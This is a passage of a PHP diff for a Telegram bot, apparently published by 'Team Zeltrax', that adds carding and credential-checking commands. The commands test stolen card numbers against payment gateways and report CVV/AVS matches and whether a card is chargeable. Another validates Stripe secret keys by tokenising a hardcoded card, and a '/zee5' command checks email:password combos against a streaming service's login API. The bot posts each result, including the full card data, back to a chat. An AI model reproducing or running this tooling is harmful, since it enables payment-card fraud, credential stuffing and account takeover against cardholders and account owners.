+$result = curl_exec($ch);
+$cvvres = string_between_two_string($result, '<input type="hidden" name="ssl_cvv2_response" value="', '"></td>');
+$avsres = string_between_two_string($result, '<input type="hidden" name="ssl_avs_response" value="', '"></td>');
+$msg = string_between_two_string($result, '<span id="ssl_result_message">', '</span>');
+
+$gdAvs = array("A","B","D","G","P","S","X","Y","Z");
+if(($cvvres == "M") && ((in_array($avsres, $gdAvs)) === true)){
+$chStatus = "Yes";
+}else{
+$chStatus = "No";
+};
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+if($cvvres == "M"){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED [M] [$avsres]</b>%0A<b>Chargeable:</b> $chStatus%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif($cvvres == "N"){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED  [N] [$avsres]</b>%0A<b>Chargeable:</b> No%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif(!$result){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Response Not Loaded</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}else{
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed  [$cvvres] [$avsres]</b>%0A<u>Message:</u><b>$msg</b>%0A<b>Chargeable:</b> $chStatus%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+};
+// Add more responses if you want
+curl_close($ch);
+}
+
+//////////=========[Schk (1req) Command]=========//////////
+
+elseif (strpos($message, "/schk") === 0){
+$lista = substr($message, 6);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mon    = $i[1];
+$year  = $i[2];
+$cvv   = $i[3];
+error_reporting(0);
+date_default_timezone_set('Asia/Jakarta');
+if ($_SERVER['REQUEST_METHOD'] == "POST"){
+extract($_POST);
+}
+elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
+extract($_GET);
+}
+function GetStr($string, $start, $end){
+$str = explode($start, $string);
+$str = explode($end, $str[1]);
+return $str[0];
+};
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: lookup.binlist.net',
+'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+$fim = curl_exec($ch);
+$bank = GetStr($fim, '"bank":{"name":"', '"');
+$name = GetStr($fim, '"name":"', '"');
+$brand = GetStr($fim, '"brand":"', '"');
+$country = GetStr($fim, '"country":{"name":"', '"');
+$scheme = GetStr($fim, '"scheme":"', '"');
+$type = GetStr($fim, '"type":"', '"');
+if(strpos($fim, '"type":"credit"') !== false){
+$bin = 'Credit';
+}else{
+$bin = 'Debit';
+};
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, '...........');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: ...........',
+'accept: ..............',
+'accept-language: .....',
+'content-Type: ........',
+'origin: ..............',
+'referer: .............',
+'sec-fetch-mode: ......',
+'sec-fetch-site: ......'));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,  '............');
+$result = curl_exec($ch);
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+if(strpos($result, '"cvc_check": "pass"')){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif (strpos($result, "incorrect_cvc")){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif(!$result){
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Response Not Loaded</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}else{
+sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+};
+// Add more responses if you want
+curl_close($ch);
+}
+
+//////////=========[Sk Key Check Command]=========//////////
+
+elseif (strpos($message, "/sk") === 0){
+$sec = substr($message, 4);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
+curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
+$headers = array();
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$result = curl_exec($ch);
+if (strpos($result, 'api_key_expired')){
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif (strpos($result, 'Invalid API Key provided')){
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}
+elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}else{
+sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+};}
+
+//////////=========[Zee5 Command]=========//////////
+
+elseif (strpos($message, "/zee5") === 0){
+$combo = substr($message, 6);
+error_reporting(0);
+set_time_limit(0);
+error_reporting(0);
+date_default_timezone_set('Asia/Kolkata');
+$date1 = date('yy-m-d');
+function multiexplode($delimiters, $string){
+$one = str_replace($delimiters, $delimiters[0], $string);
+$two = explode($delimiters[0], $one);
+return $two;
+};
+$email = multiexplode(array(":", "|", ""), $combo)[0];
+$pass = multiexplode(array(":", "|", ""), $combo)[1];
+function GetStr($string, $start, $end){
+$str = explode($start, $string);
+$str = explode($end, $str[1]);
+return $str[0];
+};
+
+///////////////////////===========[Login Check]============/////////////////////
+
+$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
+$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));
+
+/////////////////===============[Result]===========///////////////////
+
+if($token){
+sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Successfully Logged in</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+}else{
+sendMessage($chatId, "<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Wrong Email or Password</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
+};
+curl_close($ch);
+ob_flush();
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////
+
+function sendMessage ($chatId, $message, $message_id){
+$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
+file_get_contents($url);
+};
+
+////////////////=============[Team Zeltrax]=============////////////////
+////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////
+
 ?>
